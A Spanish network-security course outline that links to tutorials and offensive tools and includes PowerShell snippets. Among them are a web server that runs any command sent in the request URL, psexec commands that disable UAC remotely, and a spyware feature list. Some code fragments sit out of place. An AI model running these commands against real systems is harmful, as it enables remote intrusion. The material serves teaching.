  - Enviar mensajes
  - Descargar aplicaciones
  - Buscar notas
  - Buscar mensajes
  - Historial
  - Google Drive
  - Capturas
  - Copias de seguridad
  - Correos
  - Keylogger
  - Contactos
  - Posicion GPS
  - Grabar
  - Descargar audio y hacer sonar

## Seguridad en la red corporativa:


### Problemas de seguridad y vulnerabilidades en protocolos TCP/IP.

**Problema de seguridad UDP**
- https://github.com/JorgeDuenasLerin/seguridad-informatica-smr2dual/blob/gh-pages/apuntes/7/SI-T-07-Redes%20Seguras.docx
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-26.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-27.md

**Modificar datagrama UDP**
* https://www.jesusninoc.com/12/29/server-and-client/
* https://www.jesusninoc.com/03/19/modificar-datagramas-udp-con-softperfect-network-protocol-analyzer/
**Cliente**
```PowerShell
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]"10.20.104.100",$port)
$udpclient=new-Object System.Net.Sockets.UdpClient
$b=[Text.Encoding]::ASCII.GetBytes('Hadadsfsdfsfdasfi')
$bytesSent=$udpclient.Send($b,$b.length,$endpoint)
$udpclient.Close()
```
**Servidor**
```PowerShell
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::any,$port)
$udpclient=new-Object System.Net.Sockets.UdpClient $port
$content=$udpclient.Receive([ref]$endpoint)
[Text.Encoding]::ASCII.GetString($content)
$udpclient.Dispose()
```

**Cliente-Servidor**

**Comunicación entre cliente y servidor**
* https://www.jesusninoc.com/2015/02/25/creating-reverse-shell/
* https://www.jesusninoc.com/2015/02/26/creating-shell/
* https://www.jesusninoc.com/2017/10/18/crear-una-comunicacion-entre-un-cliente-en-bash-de-linux-y-un-servidor-en-powershell-de-windows-utilizando-tcpip/
* https://www.jesusninoc.com/2017/10/26/crear-una-comunicacion-entre-un-cliente-en-powershell-de-windows-y-un-servidor-en-bash-de-linux-utilizando-tcpip/
* https://www.jesusninoc.com/06/02/crear-una-comunicacion-entre-un-cliente-en-powershell-de-windows-y-un-servidor-en-node-js-utilizando-tcp-ip/
* https://www.jesusninoc.com/2016/04/30/simular-el-funcionamiento-de-un-servidor-web-utilizando-netcat-en-linux/
* https://www.jesusninoc.com/2009/06/06/ejecutar-nc-exe-cmd-exe-remotamente/
* https://www.jesusninoc.com/11/10/realizar-conexiones-tcp-udp-con-powershell/
* https://www.jesusninoc.com/2013/01/02/server-and-client-sockets-tcp/

**Utilizando la comunicación remota entre cliente y servidor simular una conexión a una shell y una reverse shell**
* https://www.jesusninoc.com/01/27/ejecutar-un-cmdlet-remotamente-en-un-equipo-utilizando-sockets-udp/
* https://www.jesusninoc.com/2015/02/25/creating-reverse-shell/
* https://www.jesusninoc.com/2015/02/26/creating-shell/

**Servidor desde PowerShell**
* https://www.jesusninoc.com/2017/05/06/crear-un-servidor-web-al-que-se-pueda-acceder-desde-cualquier-parte-de-la-red-privada-con-powershell/

**Ejecutar un comando remotamente utilizando un servidor web creado en PowerShell**
```Powershell
$routes = @{
    "/" = { return '<html><body>Servidor web funcionando</body></html>' }
}

#Importante poner la IP de la red privada
$url = 'http://192.168.204.222:8027/'
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

Write-Host "Funcionando $url..."

while ($listener.IsListening)
{
    $context = $listener.GetContext()
    $requestUrl = $context.Request.Url
    $response = $context.Response

    Write-Host ''
    Write-Host "Petición: $requestUrl"

    $localPath = $requestUrl.LocalPath
    $route = $routes.Get_Item($requestUrl.LocalPath)

    if ($route -eq $null)
    {
        $response.StatusCode = 404
    }
    else
    {

        $content = & $route
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    }

    $response.Close()
    start-process ($context.Request.RawUrl -replace "/")
    $context.Request.RawUrl
    $responseStatus = $response.StatusCode
    Write-Host "Respuesta: $responseStatus"
}
```

**JVM Post-Exploitation One-Liners (Reverse Shell)**
* https://gist.github.com/frohoff/a976928e3c1dc7c359f8

**Packet Sender**

Packet Sender can send and receive UDP, TCP, and SSL on the ports of your choosing.
All servers and clients may run simultaneously. https://packetsender.com/download

**SoftPerfect Network Protocol Analyzer**

**Modificar datagramas UDP con SoftPerfect Network Protocol Analyzer**
https://www.jesusninoc.com/2016/03/19/modificar-datagramas-udp-con-softperfect-network-protocol-analyzer/

**Modificar la dirección IP de origen en mensajes UDP con SoftPerfect Network Protocol Analyzer**
https://www.jesusninoc.com/2016/04/02/modificar-la-direccion-ip-de-origen-en-mensajes-udp-con-softperfect-network-protocol-analyzer/

**Modificar paquetes**

**Modificar la dirección IP de origen en mensajes UDP con SoftPerfect Network Protocol Analyzer**
https://www.jesusninoc.com/2016/04/02/modificar-la-direccion-ip-de-origen-en-mensajes-udp-con-softperfect-network-protocol-analyzer/

**Modificar datagramas UDP con SoftPerfect Network Protocol Analyzer**
https://www.jesusninoc.com/2016/03/19/modificar-datagramas-udp-con-softperfect-network-protocol-analyzer/

**Polymorph: Modificando paquetes de red en tiempo real. Inyectando JavaScript en peticiones HTTP**
http://www.elladodelmal.com/2018/04/polymorph-modificando-paquetes-de-red.html
http://www.elladodelmal.com/2018/04/polymorph-modificando-paquetes-de-red_30.html
http://www.elladodelmal.com/2018/05/polymorph-modificando-paquetes-de-red.html

**Packet generator**

A packet generator or packet builder is a type of software that generates random packets or allows the user to construct detailed custom packets. Depending on the network medium and operating system, packet generators utilize raw sockets, NDIS function calls, or direct access to the network adapter kernel-mode driver.

|Title|Author|OS|Interface|License|
|---|---|---|---|---|
AnetTest|Anton aka kronos256|Windows, Unix|CLI|GPL
Bit-Twist|Addy Yeow Chin Heng|Windows, Linux, BSD, Mac OS X|CLI|GPLv2
Cat Karat packet builder|Valery Diomin, Yakov Tetruashvili|Windows|GUI|Packet Builder License
Colasoft Packet Builder|Colasoft|Windows|GUI|Packet Builder License: Freeware
CommView Packet Generator |TamoSoft|Windows|GUI|Proprietary EULA
IP Sorcery|Josiah Zayner|Unix|CLI and GUI|GPL
Nemesis|Jeff Nathan|Windows, Unix|CLI|BSD
Ostinato|Srivats P|Windows, Linux, BSD, Mac OS X|GUI and API|GPLv3
Packet Construction Set|George Neville-Neil|Linux, BSD, Mac OS X|CLI|BSD-like
Packet Sender|Dan Nagle|Windows, Linux, Mac OS X|CLI and GUI|GPLv2
Pktgen|Linux Foundation|Linux|CLI|GPLv2
packETH|Miha Jemec aka jemcek|Linux, Windows|GUI|GPLv2
pierf|Pieter Blommaert|Windows(Cygwin)/Linux|CLI|free BSD
rain|Michael Behan|Linux, BSD|CLI|free GPLv2
Scapy|Philippe BIONDI|Linux/Unix/Windows|CLI|GPLv2
targa3|Mixter|Linux, Unix|CLI|?
UMPA|Adriano Monteiro Marques|Cross-platform (Python)|?|GPLv2
trafgen|Daniel Borkmann|Linux|CLI|GPLv2
xcap|cxxxap|Windows|GUI|Free
Simple Packet Sender (SPS)|h0h1r4um|Linux|GUI|GPLv3
WARP17|Juniper Networks|Linux|CLI and API|BSD
Wirefloss|Wirefloss|Web page|GUI|Free

**Packet Sender**
Packet Sender can send and receive UDP, TCP, and SSL on the ports of your choosing.
All servers and clients may run simultaneously. https://packetsender.com/download

**Más sobre captura de paquetes**

**Packet capture on Windows without a kernel driver**
https://github.com/nospaceships/raw-socket-sniffer

**Relación entre puertos UDP y procesos (construir un objeto con propiedades personalizadas)**
https://www.jesusninoc.com/2018/05/02/relacion-entre-puertos-udp-y-procesos-construir-un-objeto-con-propiedades-personalizadas/

**Relación entre puertos TCP y procesos (construir un objeto con propiedades personalizadas)**
https://www.jesusninoc.com/2018/05/03/relacion-entre-puertos-tcp-y-procesos-construir-un-objeto-con-propiedades-personalizadas/

**Conectarse a una carpeta compartida con PowerShell**
https://www.jesusninoc.com/2017/06/14/conectarse-a-una-carpeta-compartida-con-powershell/

**Instalar remotamente un paquete MSI**
https://www.jesusninoc.com/2017/05/27/instalar-remotamente-un-paquete-msi/

### Riesgos potenciales de los servicios de red.

**Ejercicio**
- https://www.jesusninoc.com/11/10/analizar-servicios-con-powershell/

**Obtener información del Whois de varios dominios e importarlo en PowerShell en formato XML y enviarlo por mail**
**Whois**
  - Whois https://docs.microsoft.com/en-us/sysinternals/downloads/whois
  - Whois XML https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com
  - Whois JSON https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com&_accept=application%2Fvnd.hexillion.whois-v2%2Bjson
**Importar contenido XML en PowerShell**
* https://www.jesusninoc.com/02/10/importar-un-contenido-xml-en-powershell/
**Enviar un mail desde PowerShell**
* https://www.jesusninoc.com/04/11/enviar-un-mail-desde-powershell/

**Ejercicio**

- Analizar Whois (whois)
  - Whois https://docs.microsoft.com/en-us/sysinternals/downloads/whois
  - Whois XML https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com
  - Whois JSON https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com&_accept=application%2Fvnd.hexillion.whois-v2%2Bjson
- Equivalencias entre comandos de red de Windows y Cmdlets https://www.jesusninoc.com/02/04/equivalencias-entre-comandos-de-red-de-windows-y-cmdlets-de-powershell/
- Conocer la IP por resolución DNS (nslookup) https://blog.hostalia.com/white-papers/nslookup-herramienta-gestion-servidores-dns-whitepaper/
```
set type=A, para buscar registros A.
set type=PTR, para buscar registros reversos.
set type=MX, para buscar los registros Mail Exchange del correo.
set type=TXT, para buscar registros de texto como SPF o DKIM.
set type=CNAME, para buscar alias del dominio.
```
- Conocer la IP por resolución DNS sobre CloudUnflare https://github.com/greycatz/CloudUnflare
- Historial de cambios DNS https://completedns.com/
- Pedir todos los registros DNS que pueda (set type=any)
- Recorrer el rango de IP
  - Recorrer direcciones IP https://www.jesusninoc.com/2017/07/06/recorrer-direcciones-ip/
```PowerShell
foreach($primer in 1..254)
{
    start chrome ("80.80.80."+$primer)
    Start-Sleep -Seconds 5
}
```
- Concretar el objetivo contra una IP

**Enviar informacion sobre equipos utilizando un servidor web**

* https://www.jesusninoc.com/12/02/obtener-serial-de-windows-con-powershell/
* https://www.jesusninoc.com/10/21/almacenar-entradas-cache-dns-en-un-fichero/
* https://github.com/1N3/PowerExfil

**Ejecutar aplicaciones desde lenguajes de programación**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-13.md

### Ataques en redes TCP/IP (suplantación, denegación de servicio…).

**Convertir un PS1 en EXE**

**Minimizar todos los programas**
* https://www.jesusninoc.com/02/07/minimizar-todos-los-programas-que-estan-abiertos-en-windows-con-powershell/
**Server and client (Sockets UDP)**
* https://www.jesusninoc.com/12/29/server-and-client/
**DESACTIVAR LA VISUALIZACIÓN DE INMEDIATO DESDE POWERSHELL, ABRIR NOTEPAD Y ESCRIBIR UN TEXTO**
* https://www.jesusninoc.com/07/18/desactivar-la-visualizacion-de-inmediato-desde-powershell-abrir-notepad-y-escribir-un-texto/
**HACKEAR WIFI CON POWERSHELL**
* https://www.jesusninoc.com/01/15/hackear-wifi-con-powershell/
**CREAR UN USUARIO LOCAL CON CONTRASEÑA EN WINDOWS 10**
* https://www.jesusninoc.com/02/05/crear-un-usuario-local-con-contrasena-en-windows-10/

**Modificar UDP**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-17.md
* https://www.jesusninoc.com/12/29/server-and-client/
* https://www.jesusninoc.com/03/19/modificar-datagramas-udp-con-softperfect-network-protocol-analyzer/

### Seguridad en los accesos de red. Arranque de servicios. Puertos.

**built-in**

$result2 = Get-Service -ComputerName $destinationServer
$result3 = Get-Process -ComputerName $destinationServer
```

If you’d like to open up the most commonly used remoting techniques on a test machine, run these lines from a PowerShell with elevated privileges:

```PowerShell
netsh firewall set service remoteadmin enable
Enable-PSRemoting -SkipNetworkProfileCheck -Force
```
**Lateral Movement Using WinRM and WMI**
https://redcanary.com/blog/lateral-movement-winrm-wmi/

**NO WIN32_PROCESS NEEDED – EXPANDING THE WMI LATERAL MOVEMENT ARSENAL**
https://www.cybereason.com/blog/wmi-lateral-movement-win32

**Get-WmiObject**
http://community.idera.com/powershell/powertips/b/tips/posts/wmi-quick-primer-part-2

Here are two example calls that both retrieve information about file shares from a remote system (make sure you adjust the computer name):
```PowerShell
Get-WmiObject -Class Win32_Share -ComputerName sr0710
Get-CimInstance -ClassName Win32_Share -ComputerName sr0710
```

**Get-CimInstance**
While Get-WmiObject always uses DCOM as a transport protocol, Get-CimInstance uses WSMan (a webservice-type of communication). Most modern Windows systems support WSMan, but if you need to contact older servers, they may only respond to DCOM, thus Get-CimInstance may fail.

Get-CimInstance can use session options, however, that provide great flexibility, and allow you to choose the transport protocol. In order to use DCOM (just like Get-WmiObject), do the following:

```PowerShell
$options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName sr0710 -SessionOption $options
$sh = Get-CimInstance -ClassName Win32_Share -CimSession $session
Remove-CimSession -CimSession $session
```

Here is an example illustrating how the same session is used for two queries:
http://community.idera.com/powershell/powertips/b/tips/posts/wmi-quick-primer-part-3
```PowerShell

**Conexión entre Windows, Linux y Android**

* https://www.jesusninoc.com/02/25/creating-reverse-shell/
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-08.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-09.md
* https://www.jesusninoc.com/11/12/enviar-un-video-mp4-entre-dos-linux-mediante-netcat/

**Servidores web**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-14.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-18.md
* https://twitter.com/JaneScott_/status/1011824778808717312
* https://gist.github.com/jesusninoc/9efe81d90fbb1adf8212686b62de2b7c

- https://www.jesusninoc.com/03/19/mostrar-informacion-avanzada-de-los-procesos-que-se-estan-ejecutando-en-relacion-con-los-servicios-y-los-puertos-abiertos-tcp/
- https://www.jesusninoc.com/03/20/mostrar-informacion-avanzada-de-los-procesos-que-se-estan-ejecutando-en-relacion-con-los-servicios-y-los-puertos-abiertos-udp/
- https://www.jesusninoc.com/04/13/relacion-entre-ip-puertos-y-procesos-con-powershell/
- https://www.jesusninoc.com/12/28/relacion-entre-puertos-udp-procesos-y-lista-de-puertos-de-la-iana-junto-con-una-breve-descripcion-de-cada-puerto/
- https://www.jesusninoc.com/12/29/relacion-entre-puertos-tcp-procesos-y-lista-de-puertos-de-la-iana/

### Descripción general de protocolos seguros a diferentes niveles: IPsec (Internet Protocol Security), SSL/TSL (Secure Sockets Layer/Transport Layer Security), PGP (Pretty Good Privacy), S/MIME (Secure / Multipurpose Internet Mail Extensions)...

- https://www.incibe-cert.es/sites/default/files/contenidos/guias/doc/incibe_cert_guia_para_el_uso_de_pgp_en_clientes_de_correo_electronico.pdf
- https://www.jesusninoc.com/network/

### Seguridad en los protocolos para comunicaciones inalámbricas.

**WIFI**

* http://rubyfu.net/content/module_0x3__network_kung_fu/ssid_finder.html
* https://www.jesusninoc.com/10/16/enviar-paquetes-de-desasociacion-con-aireplay-ng-a-un-cliente-que-actualmente-esta-asociado-con-un-punto-de-acceso-en-linux-realizando-una-conexion-ssh-desde-powershell-en-windows/

### Monitorización del tráfico en redes.

**Ejercicio: conectarse a un Routerboard de MikroTik, establecer una dirección IP en el dispositivo y capturar tráfico con la herramienta Packet Sniffer**

**Ayuda**
**Manual:First time startup**
* https://wiki.mikrotik.com/wiki/Manual:First_time_startup
**Manual:IP/Address**
* https://wiki.mikrotik.com/wiki/Manual:IP/Address
**Do not use console numbers to get parameter values**
* https://wiki.mikrotik.com/wiki/Manual:Scripting_Tips_and_Tricks#Do_not_use_console_numbers_to_get_parameter_values
**Manual:Tools/Packet Sniffer**
* https://wiki.mikrotik.com/wiki/Manual:Tools/Packet_Sniffer
**Torch (/tool torch)**
* https://wiki.mikrotik.com/wiki/Manual:Troubleshooting_tools#Torch_.28.2Ftool_torch.29

**Sniffers**

**Proyecto: analizar información de los distintos protocolos de la red (DNS, LLMNR, DHCP, HTTP, FTP, SMTP, CUPS)**
* https://github.com/jesusninoc/ClasesASO/blob/master/2019-10-07.md#proyecto-analizar-informaci%C3%B3n-de-los-distintos-protocolos-de-la-red-dns-llmnr-dhcp-http-ftp-smtp-cups

**¿Qué podemos analizar en la red con Wireshark?**
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-21.md

**Análisis de conexiones de red**
* https://www.jesusninoc.com/05/01/analisis-de-conexiones-de-red/

**Tcpdump**
* http://www.thegeekstuff.com/2010/08/tcpdump-command-examples

**Wireshark**
* https://www.jesusninoc.com/wireshark/

**Practical Packet Analysis, 3rd Edition**
* https://nostarch.com/packetanalysis3

**ANÁLISIS DE TRÁFICO CON WIRESHARK**
* https://www.incibe.es/extfrontinteco/img/File/intecocert/EstudiosInformes/cert_inf_seguridad_analisis_trafico_wireshark.pdf

**Wireshark User’s Guide**
* https://www.wireshark.org/docs/wsug_html_chunked/

**Download the capture files for this book (.zip)**
* https://nostarch.com/packetanalysis3

**Capturar tráfico con tshark**
* https://www.jesusninoc.com/04/24/capturar-trafico-con-tshark/

**Ejercicio: conectarse a un Routerboard de MikroTik, establecer una dirección IP en el dispositivo y capturar tráfico con la herramienta Packet Sniffer**

**Ayuda**
**Manual:First time startup**
* https://wiki.mikrotik.com/wiki/Manual:First_time_startup
**Manual:IP/Address**
* https://wiki.mikrotik.com/wiki/Manual:IP/Address
**Do not use console numbers to get parameter values**
* https://wiki.mikrotik.com/wiki/Manual:Scripting_Tips_and_Tricks#Do_not_use_console_numbers_to_get_parameter_values
**Manual:Tools/Packet Sniffer**
* https://wiki.mikrotik.com/wiki/Manual:Tools/Packet_Sniffer

**Scapy**

**Network packet manipulation with Scapy**
http://www.secdev.org/conf/scapy_Aachen.pdf

**Construyendo un paquete UDP con Scapy**
https://dan1t0.wordpress.com/2011/02/07/scapy-udp/

**How to Build a TCP Connection in Scapy**
https://www.fir3net.com/Programming/Python/how-to-build-a-tcp-connection-in-scapy.html

**Scapy: Finding All Wi-Fi Devices**
https://www.youtube.com/watch?v=tJuuh5CSP5c

**Raw Packet Manipulation with Scapy**
https://www.endpoint.com/blog/2015/04/29/raw-packet-manipulation-with-scapy

**Análisis de paquetes**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-07.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-11.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-20.md

**¿Qué podemos analizar en la red con Wireshark?**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-21.md

### Intentos de penetración. Intrusiones externas vs. Intrusiones internas. Seguridad perimetral.

**For use with Kali Linux. Custom bash scripts used to automate various pentesting tasks.**

https://github.com/leebaird/discover

Follow on Twitter [![Twitter Follow](https://img.shields.io/twitter/follow/discoverscripts.svg?style=social&label=Follow)](https://twitter.com/discoverscripts) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/leebaird/discover/blob/master/LICENSE)

For use with Kali Linux. Custom bash scripts used to automate various pentesting tasks.

**Download, setup & usage**
* git clone https://github.com/leebaird/discover /opt/discover/
* All scripts must be ran from this location.
* cd /opt/discover/
* ./update.sh

```
RECON
1.  Domain
2.  Person
3.  Parse salesforce

SCANNING
4.  Generate target list
5.  CIDR
6.  List
7.  IP, range, or domain
8.  Rerun Nmap scripts and MSF aux

WEB
9.  Insecure direct object reference
10. Open multiple tabs in Firefox
11. Nikto
12. SSL

MISC
13. Crack WiFi
14. Parse XML
15. Generate a malicious payload
16. Start a Metasploit listener
17. Update
18. Exit
```

**remove the session at the end**

Remove-CimSession -CimSession $session
```

- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-23.md#equipos-rojos

**Pentesters**

**PowerShell for Pentesters**
* http://www.securitytube-training.com/online-courses/powershell-for-pentesters/index.html
* https://github.com/salu90/PSFPT

**Empire**
* https://github.com/EmpireProject/Empire
* https://unicornriot.ninja/2019/massive-hack-strikes-offshore-cayman-national-bank-and-trust/#4.2

**AutoRDPwn – La guía definitiva**
* https://darkbyte.net/autordpwn-la-guia-definitiva/

**Powercat**
* https://github.com/besimorhino/powercat

**Posh-SecMod**
* https://github.com/darkoperator/Posh-SecMod

**PowerSploit**
* https://github.com/PowerShellMafia/PowerSploit/

**Nishang**
* https://github.com/samratashok/nishang

**Embed a Metasploit Payload in an Original .Apk**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-10.md
* https://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-part-2-do-manually-0167124/

**Acercarse al objetivo**

* https://github.com/jesusninoc/ClasesISO/blob/master/2018-03-01.md

**Fallos posibles**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-14.md

**PowerShell for Pentesters**

* http://www.securitytube-training.com/online-courses/powershell-for-pentesters/index.html
* https://github.com/salu90/PSFPT

**AutoRDPwn – La guía definitiva**

* https://darkbyte.net/autordpwn-la-guia-definitiva/

**Powercat**

* https://0xword.com/es/libros/69-pentesting-con-powershell.html

**PowerTools**

* https://0xword.com/es/libros/69-pentesting-con-powershell.html

**Posh-SecMod**

* https://0xword.com/es/libros/69-pentesting-con-powershell.html

**PowerSploit**

* https://0xword.com/es/libros/69-pentesting-con-powershell.html

**Nishang**

* https://0xword.com/es/libros/69-pentesting-con-powershell.html

**Metasploit**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-26.md

**Awesome Red Teaming**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-23.md
* https://github.com/yeyintminthuhtut/Awesome-Red-Teaming
* https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts

**Bounty Write-up (HTB)**

* https://medium.com/ctf-writeups/bounty-write-up-htb-9b01c934dfd2

## Herramientas de seguridad y monitorización

**Scripts**

* https://github.com/jesusninoc/Scripts
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-10-25.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-10-29.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-12-03.md
- https://sectools.org/
- https://teamghsoftware.wordpress.com/maltrail-herramienta-para-monitorizacion-de-red-y-deteccion-de-amenazas/

**Herramientas preventivas y paliativas (descifrar contraseñas, anti-rootkit, sniffers, escaneadores de puertos, detectores de vulnerabilidades, sistemas de detección de intrusos, recuperación de datos…)**


### Instalación y configuración básica.


# Implantación de seguridad perimetral

## Elementos básicos de la seguridad perimetral (sistemas bastión, cortafuegos, proxys, VPNs (Virtual Private Networks)…

- http://www.ptolomeo.unam.mx:8080/xmlui/bitstream/handle/132.248.52.100/782/A5.pdf?sequence=5

## Arquitecturas de seguridad perimetral


### Arquitectura débil de subred protegida.


### Arquitectura fuerte de subred protegida.


### Perímetros de red. Zonas desmilitarizadas DMZ (Demilitarized Zone).


### Otras arquitecturas.


# Instalación y configuración de cortafuegos

## Concepto de cortafuegos.

**Teoría**

**Conceptos y funcionamiento**
* https://ccia.esei.uvigo.es/docencia/SSI/1819/apuntes/SSI_redes_perimetral.pdf

**Tesis Mikrotik**
* https://juliorestrepo.files.wordpress.com/2014/05/tesis-mikrotik.pdf

## Características. Funciones principales y adicionales.


## Tipos de cortafuegos


### Clasificación por tecnología: filtrado de paquetes de datos, pasarelas de nivel de aplicación (proxys), pasarelas de nivel de circuitos (híbridos).


### Clasificación por ubicación: cortafuegos personales, cortafuegos para pequeñas redes SOHO (Small Office Home Office), cortafuegos corporativos.


### Cortafuegos software vs. equipos hardware específicos.


## Instalación y configuración de cortafuegos. Ubicación.

**Regla iptables**

```Bash
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
```

**Prácticas en el Firewall de Windows**

**Ayuda**
* https://www.jesusninoc.com/firewall/

**Programar reglas en el Firewall de Windows (solución de Miguel)**
* https://github.com/MikeRuSe/Scripts/blob/master/2020_01_17-Firewall-Rule.ps1

**Bloquear mediante una regla en PowerShell el acceso entre un cliente y un servidor creado por ti mismo**
**SERVER AND CLIENT (SOCKETS UDP)**
* https://www.jesusninoc.com/12/29/server-and-client/
**Código que permite la recepción de mensajes del puerto 2020 y el protocolo UDP**
```PowerShell
New-NetFirewallRule -DisplayName cllase232 -Action Allow -Direction Inbound -Enabled True -Protocol UDP -LocalPort 2020
```

### Utilización de cortafuegos. Reglas de filtrado de cortafuegos.


### Pruebas de funcionamiento. Sondeo.


### Registros de sucesos de un cortafuegos.


## Distribuciones libres para implementar cortafuegos en máquinas dedicadas.


## Integración con otras tecnologías: NAT, VPNs, sistemas de detección de intrusos IDS (Intrusion Detection System), QoS, antivirus….

**Massive Hack Strikes Offshore Cayman National Bank and Trust**

* https://www.elconfidencial.com/tecnologia/2019-11-19/hack-banco-islas-caiman-cuentas-filtradas_2342778/
* https://unicornriot.ninja/2019/massive-hack-strikes-offshore-cayman-national-bank-and-trust
* https://unicornriot.ninja/2019/massive-hack-strikes-offshore-cayman-national-bank-and-trust/#4.1
* https://empresas.blogthinkbig.com/shellshock-como-se-podria-explotar-en/

**(adjust it to a valid name in your network)**

$destinationServer = "SERVER12"

# Instalación y configuración de servidores «proxy»

## Tipos de «proxy». Características y funciones.

**Tipos de proxy**

- Proxy Caché

**Simular un proxy en PowerShell**

* https://www.jesusninoc.com/01/15/ejercicios-de-powershell-simular-el-funcionamiento-de-un-proxy-mediante-una-conexion-udp-entre-un-cliente-y-un-servidor-que-solicitan-una-imagen-y-si-la-imagen-ya-se-ha-descargado-se-indica-en-un-men/

**Tipos de proxy**

- Proxy Caché
- Proxy de Web
- Proxies transparentes
- Proxy inverso (Reverse Proxy)
- Proxy NAT (Network Address Translation)
- Proxy abierto

**Proxy en cliente**
* https://www.jesusninoc.com/05/11/configuracion-actual-del-proxy-winhttp/
* https://www.jesusninoc.com/03/27/habilitar-o-deshabilitar-un-servidor-proxy-en-internet-explorer-utilizando-powershell/
* https://www.jesusninoc.com/02/09/configurar-firefox-para-utilizar-un-tunel-ssh-como-un-proxy-socks/
* https://www.jesusninoc.com/02/23/ataque-de-fuerza-bruta-con-burp-suite-intruder/

**Proxy**

* https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
* https://www.zaproxy.org/
* https://mitmproxy.org/

## Instalación y configuración de de servidores «proxy».


### Configuración del almacenamiento en la caché de un «proxy».


### Configuración de filtros.


### Métodos de autenticación en un «proxy».


### Monitorización y registros de actividad (logs).


### Herramientas para generar informes sobre logs de servidores proxy.


## Instalación y configuración de clientes «proxy».


# Implantación de técnicas de acceso remoto. VPNs (Virtual Private Networks)

## Redes privadas virtuales. VPN. Elementos de una VPN.

**Simular una VPN**

- Hacer login
  - https://www.jesusninoc.com/01/24/ejercicios-de-seguridad-simular-el-funcionamiento-de-una-vpn-desde-powershell/#Hacer_login
- Comprobar integridad en mensajes
  - https://www.jesusninoc.com/01/24/ejercicios-de-seguridad-simular-el-funcionamiento-de-una-vpn-desde-powershell/#Comprobar_integridad_en_mensajes
- Securizar la conexión, securizar el UDP (utilizar los certificados)
  - https://www.jesusninoc.com/01/24/ejercicios-de-seguridad-simular-el-funcionamiento-de-una-vpn-desde-powershell/#Securizar_la_conexion_securizar_el_UDP_utilizar_los_certificados
- Crear un adaptador que hace un DHCP (crear un adaptador que pone una dirección IP)
  - https://www.jesusninoc.com/01/24/ejercicios-de-seguridad-simular-el-funcionamiento-de-una-vpn-desde-powershell/#Crear_un_adaptador_que_hace_un_DHCP_crear_un_adaptador_que_pone_una_direccion_IP

## Beneficios y desventajas con respecto a las líneas dedicadas.


## Esquemas de VPNs


### VPNs punto a punto.


### VPNs de acceso remoto (LAN a road warrior).


### VPN extremo a extremo (LAN a LAN).


## Tecnologías y protocolos de VPNs.


### PPTP (Point-to-Point Tunneling Protocol).


### IPsec (Internet Protocol Security).


### IPsec/L2PT (Layer Two Tunneling Protocol).


### SSL/TSL (Secure Sockets Layer/ Transport Layer Security). OpenVPN.


### SSH (Secure Shell).


## VPNs por hardware vs. VPNs por software.


## VPNs a nivel de enlace, nivel de red y nivel de aplicación.


## Técnicas de cifrado en VPNs. Clave pública y clave privada.


## Servidores de acceso remoto y VPN:

**Ejecutar un comando remotamente en un equipo con PowerShell**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-14.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-15.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-16.md
* https://www.jesusninoc.com/10/07/crear-un-cliente-y-un-servidor-tcpip-con-powershell/
* https://www.jesusninoc.com/03/08/psexec/
```cmd
psexec -u jesusninoc\administrador \\2017lti1-19 -i -d cmd /c notepad
psexec -u jesusninoc\administrador \\192.168.104.122 -i -d cmd /c powershell -encodedcommand RwBlAHQALQBEAGEAdABlAA=="
psExec.exe -i \\192.168.1.56 powershell f:\script.ps1 #script.ps1 tiene que existir en el equipo remoto
psexec \\dnsname-or-ip reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```

**Acceso remoto desde Powershell**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-16.md

**PowerShell remoting**

$result1 = Invoke-Command { Get-Service } -ComputerName $destinationServer

**Enviar un formlario con un comportamiento X entre clientes y servidores**

- Intentar controlar el formulario enviado remotamente
  * https://www.jesusninoc.com/02/12/enviar-una-ventana-mediante-el-protocolo-udp-de-un-ordenador-a-otro-desde-powershell-hacerlo-de-forma-simple-y-sencilla/

